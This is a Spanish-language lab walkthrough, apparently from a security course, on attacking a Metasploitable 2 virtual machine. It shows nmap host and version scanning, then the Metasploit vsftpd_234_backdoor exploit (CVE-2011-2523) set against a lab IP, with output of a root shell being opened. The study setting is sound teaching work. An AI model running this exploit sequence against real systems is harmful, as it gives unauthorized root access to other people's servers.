Este archivo te ayudara en lo que es el avance, pero no te dará las respuestas del otro archivo de manera directa

Bien… empecemos.


Primero informémonos, hagámoslo como si fuera un ataque REAL a una maquina servidor.
<p align="left">
  <img src="https://i.postimg.cc/kgb4xZVM/imagen-2024-09-16-230201231.png" width="75%" height="75%" align="">
</p>

Como dice el documento, es una máquina Ubuntu, una versión modificada llamada Metasploitable (Versión 2) así que el trabajo que tendremos será fácil.

Primero debemos saber qué dirección IP tiene, podemos hacerlo de 2 maneras:
# 1ra opción:
Puedes encender la máquina virtual Metasploitable e ingresar a la máquina, pedirá un usuario y contraseña.
DATO: cuando hagamos clic en la máquina virtual, no se verá el puntero (mouse), para que aparezca debemos presionar la combinación “Ctrl + Alt”
<p align="left">
  <img src="https://i.postimg.cc/PrGZ0mmq/imagen-2024-09-16-230439087.png" width="75%" height="75%" align="">
</p>
Aunque no sabemos el usuario y contraseña, podemos buscar información en la red aunque lo que haremos ahora mismo es algo simple y que solo haremos 1 vez.
Buscamos en la red.
<p align="left">
  <img src="https://i.postimg.cc/9Qwf2SC5/imagen-2024-09-16-230913210.png" width="75%" height="75%" align="">
</p>
Bien, conseguimos el usuario y contraseña (se tapó el resultado para que tú mismo lo busques). Ahora podemos ingresarlo a la maquina víctima.
<p align="left">
  <img src="https://i.postimg.cc/3NWTB4w5/imagen-2024-09-16-230941395.png" width="75%" height="75%" align="">
</p>
Como vemos, hemos ingresado a la máquina y ahora si podemos saber la IP con el comando:
  ```sh
  ifconfig
  ```
Ahora podemos ver la IP de la maquina:
<p align="left">
  <img src="https://i.postimg.cc/3RtyNvqP/imagen-2024-09-16-231208197.png" width="75%" height="75%" align="">
</p>
Ojo: no será la misma IP que se muestra en la imagen, en tu caso será uno diferente, por eso debes buscarla.

# 2da manera:
Para este debemos abrir la máquina que usaremos para atacar (Kali Linux u otro sistema operativo). En este usaremos NMAP, la cual es una herramienta de escaneo, hagamoslo como super usuario.
  ```sh
  nmap (ip de rango al que buscar)
  ```
Ese nos ayudara para poder conseguir desde una mascara, para conseguir la ip de mascara es solo ver la ip. Hagamos un ejemplo.

Digamos que si sabemos que nuestra ip es: 192.168.1.2
Solo debemos eliminar el ultimo digito para cambiarlo por un 0 y luego agregar el rango (por defecto 24)
y tendriamos algo asi como: 192.168.1.0/24
hagamoslo con el ip nuestro.
<p align="left">
  <img src="https://i.postimg.cc/bv26b42R/imagen-2024-09-16-233139363.png" width="75%" height="75%" align="">
</p>
Bien, veremos una maquina que tiene varios puertos abierto, esa debe ser la máquina victima.

Si observamos podemos ver que tiene varios puertos abiertos, hagamos un escaneo con nmap para ver que versiones de estos puertos tienen, usamos la bandera "-sV"
  ```sh
  nmap -sV (IP de la maquina victima)
  ```
<p align="left">
  <img src="https://i.postimg.cc/QtSj7fP0/imagen-2024-09-16-235310408.png" width="75%" height="75%" align="">
</p>
Bien, ahora podemos ver que hay varios servicios que corren pero todos son antiguos, significa que pueden ser vulnerables, probemos con el primero y investiguemos.

vsFTPd (del inglés very secure FTP daemon), es un servidor de FTP popular entre sistemas Unix y Linux. Sirve para tranferir archivos por el servicio de FTP, aunque al parecer la version que tiene ahora mismo tiene una vulnerabilidad que es publica... Es la CVE-2011-2523, la cual tiene un Backdoor.

Con esto en mente, podremos exploitar la maquina, usemos Metasploit para ver si tiene registrado esta vulnerabilidad. Metasploit Framework es una plataforma modular de pruebas de penetración basada en Ruby que le permite escribir, probar y ejecutar código de explotación . Metasploit Framework contiene un conjunto de herramientas que puede utilizar para probar vulnerabilidades de seguridad, enumerar redes, ejecutar ataques y evadir la detección.

Iniciemos Metasploit con el comando 
  ```sh
  msfconsole
  ```
Empezara a cargar Metasploit.
<p align="left">
  <img src="https://i.postimg.cc/d3zDxWBw/imagen-2024-09-16-234723216.png" width="75%" height="75%" align="">
</p>
Bien, ahora usaremos un comando dentro de Metasploit, la cual nos ayudara a poder buscar dentro de sus modulos una vulnerabilidad que tenga. Este comando es "search", usemoslo con la version que encontramos.
  ```sh
  search vsftpd 2.3.4
  ```
<p align="left">
  <img src="https://i.postimg.cc/XJ2cP0mF/imagen-2024-09-16-235901481.png" width="75%" height="75%" align="">
</p>
Bien, nos muestra un resultado el cual nos ayudara, usemos el comando "use" para poder usarlo (valga la rebundancia XD).
  ```sh
  $  use 0
  ```
Nos mostrara esto
  ```sh
  [*] No payload configured, defaulting to cmd/unix/interact
  msf6 exploit(unix/ftp/vsftpd_234_backdoor) > 
  ```
La parte que dice "No payload configured" la dejaremos asi, ya que en si ya esta configurado para UNIX. Que viene por defecto.

Ahora, configuremos el exploit, veamos las opciones que tiene con el comando "options".
  ```sh
  msf6 exploit(unix/ftp/vsftpd_234_backdoor) > options

  Module options (exploit/unix/ftp/vsftpd_234_backdoor):

     Name     Current Setting  Required  Description
     ----     ---------------  --------  -----------
     CHOST                     no        The local client address
     CPORT                     no        The local client port
     Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
     RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
     RPORT    21               yes       The target port (TCP)


  Payload options (cmd/unix/interact):

     Name  Current Setting  Required  Description
     ----  ---------------  --------  -----------


  Exploit target:

     Id  Name
     --  ----
     0   Automatic
  


  View the full module info with the info, or info -d command.
  ```
Nos muestra esto, vamos a colocar la ip de la maquina victima para poder ejecutar el exploit, usemos el comando "set" y para que ira, en este caso para RHOSTS.
  ```sh
  msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.79.128
  RHOSTS => 192.168.79.128
  ```
Bien, dice que ya esta colocado, ahora ejecutemos el exploit con el comando "exploit" o "run", cualquiera de los dos sirve.
  ```sh
  msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

  [*] 192.168.79.128:21 - Banner: 220 (vsFTPd 2.3.4)
  [*] 192.168.79.128:21 - USER: 331 Please specify the password.
  [+] 192.168.79.128:21 - Backdoor service has been spawned, handling...
  [+] 192.168.79.128:21 - UID: uid=0(root) gid=0(root)
  [*] Found shell.
  [*] Command shell session 1 opened (192.168.79.133:44365 -> 192.168.79.128:6200) at 2024-09-17 01:13:05 -0400
  ```
Nos dice que funciono, ahora podemos ver el contenido.

## OJO:
Recordemos las carpetas Raiz, las cuales son "/etc", "/bin", "/share" y "/home", cada una tiene cosas que nos ayuda a organizar cada cosa, como "/home". El cual contiene los usuarios, posiblemente en otra carpeta llamada "users" o puede que no. Ya es cosa de verificar.
